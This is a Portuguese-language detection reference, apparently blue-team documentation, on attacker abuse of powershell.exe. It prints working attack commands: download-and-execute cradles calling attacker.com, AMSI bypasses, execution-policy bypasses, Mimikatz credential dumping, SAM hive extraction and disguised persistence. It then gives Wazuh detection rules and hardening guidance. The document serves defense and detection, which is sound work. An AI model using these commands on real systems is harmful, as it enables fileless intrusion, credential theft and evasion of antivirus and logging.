# powershell.exe

**Plataforma:** Windows (Vista em diante; PowerShell Core também em Linux/macOS)

**Categorias:** Execução de código, Download, AWL Bypass, Dump de credenciais, Reconhecimento, Persistência

**MITRE ATT&CK:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer), T1003 (Credential Dumping), T1027 (Obfuscated Files)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Powershell/

---

## O que é o powershell.exe

O PowerShell é o shell de linha de comando e linguagem de script da Microsoft, presente em todas as versões do Windows desde o Vista. É a plataforma de automação oficial do Windows para administração de sistemas, gerenciamento de Active Directory, configuração de servidores e praticamente todas as tarefas administrativas modernas em ambientes Microsoft.

O PowerShell tem acesso nativo ao .NET Framework, à API do Windows, ao registro, ao WMI, ao Active Directory e a praticamente qualquer recurso do sistema operacional. Diferente de outras ferramentas desta lista, o PowerShell não é apenas um binário com uma função específica — é uma plataforma de programação completa integrada ao sistema.

---

## Por que atacantes usam o powershell.exe

O PowerShell é, sem exagero, a ferramenta mais usada em ataques modernos contra ambientes Windows. Sua combinação de acesso ao sistema, capacidade de download nativo, suporte a execução em memória e presença garantida em todo sistema Windows o torna o canivete suíço do atacante moderno.

Grupos APT e operadores de ransomware praticamente universais documentam uso extensivo de PowerShell. Frameworks de C2 como Empire, Cobalt Strike, Metasploit e outros têm PowerShell como vetor primário. A detecção de abuso de PowerShell é, por isso, uma das capacidades mais críticas que um blue team pode desenvolver.

---

## Técnicas de abuso

### Download e execução em memória (fileless)

Esta é a técnica mais comum: baixar e executar código diretamente em memória sem tocar o disco.

```powershell
# Baixar e executar script em memória (IEX + DownloadString)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Variações de sintaxe (para evasão)
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
iex(iwr 'http://attacker.com/payload.ps1' -UseBasicParsing)

# Com TLS explícito
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1')

# Baixar e executar executável
(New-Object Net.WebClient).DownloadFile('http://attacker.com/payload.exe', "$env:TEMP\update.exe")
Start-Process "$env:TEMP\update.exe"
```

### Execução com bypass de política de execução

Por padrão, o PowerShell restringe a execução de scripts não assinados via `ExecutionPolicy`. Isso não é um controle de segurança real — é uma medida de proteção contra execução acidental. Pode ser contornado de múltiplas formas:

```powershell
# Bypass via flag de linha de comando
powershell.exe -ExecutionPolicy Bypass -File payload.ps1
powershell.exe -ep bypass -File payload.ps1

# Bypass via escopo de processo
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Executar script a partir de stdin (ignora ExecutionPolicy)
Get-Content payload.ps1 | powershell.exe -

# Ler e executar via IEX (não requer política de execução)
powershell.exe -Command "IEX (Get-Content payload.ps1 -Raw)"
```

### Execução codificada em base64 (EncodedCommand)

A flag `-EncodedCommand` aceita um script codificado em UTF-16LE + base64, o que é amplamente usado para ocultar o conteúdo do comando de monitoramentos que analisam apenas a linha de comando em texto claro.

```powershell
# Codificar comando (feito pelo atacante)
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# Executar no alvo
powershell.exe -EncodedCommand <base64_aqui>
powershell.exe -enc <base64_aqui>
powershell.exe -e <base64_aqui>
```

### Bypass de AMSI (Antimalware Scan Interface)

O AMSI é a interface que permite ao Windows Defender e outros antivírus inspecionar o conteúdo de scripts PowerShell em tempo de execução. Existem diversas técnicas de bypass:

```powershell
# Bypass clássico via reflection (patch em memória do provider AMSI)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Via variável de ambiente (menos eficaz em versões recentes)
$env:COMPlus_EnableAMSI=0

# Usando strings fragmentadas para evitar detecção do próprio bypass
$a = 'System.Management.Automation.A'+'msiUtils'
$b = [Ref].Assembly.GetType($a)
$c = $b.GetField('amsiInitFailed','NonPublic,Static')
$c.SetValue($null,$true)
```

### Download de arquivos binários

```powershell
# Método WebClient
(New-Object Net.WebClient).DownloadFile('http://attacker.com/tool.exe', 'C:\temp\tool.exe')

# Método Invoke-WebRequest (mais moderno)
Invoke-WebRequest -Uri 'http://attacker.com/tool.exe' -OutFile 'C:\temp\tool.exe'
iwr 'http://attacker.com/tool.exe' -OutFile 'C:\temp\tool.exe'

# Via BITS (Background Intelligent Transfer Service)
Start-BitsTransfer -Source 'http://attacker.com/payload.exe' -Destination 'C:\temp\payload.exe'
```

### Reconhecimento de Active Directory

```powershell
# Listar usuários do domínio
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Listar grupos e membros
Get-ADGroup -Filter * | Get-ADGroupMember | Select-Object name, objectClass

# Listar controladores de domínio
Get-ADDomainController -Filter *

# Descobrir usuários com Kerberoasting (SPN configurado)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Listar computadores do domínio
Get-ADComputer -Filter * | Select-Object Name, OperatingSystem, IPv4Address
```

### Dump de credenciais via PowerShell

```powershell
# Usando Invoke-Mimikatz (carregado em memória, sem tocar disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump do SAM via registro (sem ferramentas externas)
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
# Depois usar secretsdump offline
```

### Persistência via registro e tarefas agendadas

```powershell
# Persistência via Run key no registro
$cmd = 'powershell.exe -enc <payload_base64>'
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value $cmd

# Tarefa agendada disfarçada
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-enc <payload_base64>'
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName 'WindowsDefenderUpdate' -Action $action -Trigger $trigger -RunLevel Highest
```

---

## Técnicas de bypass e evasão

### Execução via processo filho para ocultar parent process

```cmd
:: Executar PowerShell como filho de um processo benigno
wmic process call create "powershell.exe -enc <payload>"
cmd /c powershell.exe -enc <payload>
```

### Uso de PowerShell versão 2 para contornar logging

O PowerShell v2 não suporta Script Block Logging e outras capacidades de monitoramento modernas. Se o .NET Framework 2.0 está instalado, o atacante pode forçar o uso da versão antiga:

```cmd
powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### Constrained Language Mode bypass

O Constrained Language Mode (CLM) é uma restrição de segurança do PowerShell que bloqueia tipos .NET arbitrários. Pode ser contornado com runspaces customizados ou via PowerShell v2.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- `-EncodedCommand` ou `-enc` ou `-e` na linha de comando — conteúdo ofuscado
- `DownloadString` + `IEX` ou `Invoke-Expression` — download e execução em memória
- `-ExecutionPolicy Bypass` ou `-ep bypass` — contorno da política de execução
- Referência a `AmsiUtils` ou `amsiInitFailed` — tentativa de bypass do AMSI
- PowerShell v2 (`-Version 2`) — contorno de logging

**Indicadores de média relevância:**

- PowerShell iniciado por processo filho de Office (Word, Excel, Outlook) — spear phishing
- `Start-BitsTransfer` com URL externa
- `Get-ADUser`, `Get-ADComputer`, `Get-ADGroup` executados por usuário comum — reconhecimento de AD
- PowerShell escrevendo em diretórios de sistema ou registro de Run keys

### Habilitar Script Block Logging (crítico)

O PowerShell Script Block Logging registra o conteúdo real do script executado, mesmo após decodificação de base64:

```powershell
# Via GPO ou registro
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1

# Também habilitar Module Logging
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Name 'EnableModuleLogging' -Value 1
```

Com Script Block Logging ativo, os eventos aparecem no canal `Microsoft-Windows-PowerShell/Operational` com Event ID 4104, e o Wazuh os ingere via configuração de `localfile`.

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0201-lolbas_execution.xml -->

<!-- PowerShell com EncodedCommand -->
<rule id="100309" level="12">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)powershell(\.exe)?$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc|-EncodedCommand|-e\s+[A-Za-z0-9+/]{20})</field>
  <description>PowerShell com comando codificado em base64 — possivel execucao ofuscada</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1027</id>
  </mitre>
</rule>

<!-- PowerShell com DownloadString + IEX -->
<rule id="100310" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)powershell(\.exe)?$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(DownloadString|DownloadFile|WebClient).*(IEX|Invoke-Expression)</field>
  <description>PowerShell baixando e executando codigo em memoria — padrao fileless</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1105</id>
  </mitre>
</rule>

<!-- PowerShell com bypass de AMSI -->
<rule id="100311" level="15">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)powershell(\.exe)?$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)amsiInitFailed|AmsiUtils|amsiContext</field>
  <description>PowerShell com tentativa de bypass do AMSI — evasao de antivirus</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1562.001</id>
  </mitre>
</rule>

<!-- PowerShell v2 (contorna logging) -->
<rule id="100312" level="12">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)powershell(\.exe)?$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)-[Vv]ersion\s+2</field>
  <description>PowerShell forcando versao 2 — possivel tentativa de contornar Script Block Logging</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
</rule>

<!-- PowerShell iniciado por processo Office -->
<rule id="100313" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)powershell(\.exe)?$</field>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)(WINWORD|EXCEL|OUTLOOK|POWERPNT|MSPUB|ONENOTE)\.EXE$</field>
  <description>PowerShell iniciado por aplicativo Office — possivel macro maliciosa ou phishing</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1566.001</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts de administração e automação:** ambientes corporativos usam PowerShell intensivamente para gestão de sistemas. O uso de `-EncodedCommand` por ferramentas de gerenciamento (Ansible WinRM, SCCM, scripts de GPO) é comum. Filtre pelo hash do script ou pelo usuário de serviço de gerenciamento.

**Ferramentas de monitoramento:** agentes de monitoramento frequentemente usam PowerShell. Identifique os padrões normais do ambiente e crie exceções baseadas em usuário + caminho de origem.

---

## Proteção e controles defensivos

**Habilitar Script Block Logging e Module Logging:** esta é a medida mais impactante — registra o conteúdo real de todos os scripts PowerShell executados, eliminando a eficácia do encoding base64 como evasão.

**Constrained Language Mode via AppLocker ou WDAC:** quando AppLocker ou WDAC estão configurados, o PowerShell automaticamente entra em Constrained Language Mode para scripts não assinados, bloqueando acesso a tipos .NET arbitrários e reduzindo drasticamente o que um atacante pode fazer.

**Desativar PowerShell v2:** o PowerShell v2 não tem as capacidades de logging modernas. Remova o .NET Framework 2.0 onde possível: `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2`.

**Bloqueio de scripts não assinados via WDAC:** uma política WDAC que exige assinatura de código para execução de scripts PowerShell bloqueia a execução de payloads não assinados, mesmo via `IEX`.

---

## Referências

- LOLBAS — powershell.exe: https://lolbas-project.github.io/lolbas/Binaries/Powershell/
- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK T1027: https://attack.mitre.org/techniques/T1027/
- Microsoft — About Script Block Logging: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
